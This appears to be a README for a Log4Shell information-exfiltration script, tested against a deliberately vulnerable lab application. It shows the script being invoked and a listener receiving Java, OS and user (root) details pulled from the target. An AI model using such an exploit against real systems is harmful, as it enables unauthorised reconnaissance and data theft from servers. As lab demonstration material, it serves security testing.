# Log4Exfiltrate
Log4j information exfiltration script (outline)

Just a test.

Made based on [Christophe Tafani-Dereeper log4shell vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app)

```
$ ./log4xfiltrate.php http://127.0.0.1:4444/
Server Listening on 0.0.0.0:7359
Received Connection from 172.17.0.5:36798


[+] Exfiltrated data:

java.version  =>  1.8.0_181
java.home  =>  /usr/lib/jvm/java-1.8-openjdk/jre
java.vm.specification.version  =>  1.8
java.vm.specification.name  =>  Java Virtual Machine Specification
java.vm.version  =>  25.181-b13
java.vm.name  =>  OpenJDK 64-Bit Server VM
java.specification.version  =>  1.8
java.specification.name  =>  Java Platform API Specification
java.class.version  =>  52.0
java.class.path  =>  /app/spring-boot-application.jar
java.library.path  =>  /usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib
java.io.tmpdir  =>  /tmp
java.ext.dirs  =>  /usr/lib/jvm/java-1.8-openjdk/jre/lib/ext:/usr/java/packages/lib/ext

os.name  =>  Linux
os.arch  =>  amd64
os.version  =>  5.10.0-kali8-amd64

user.name  =>  root
user.home  =>  /root
user.dir  =>  /
user.country  =>  US
user.language  =>  en

```
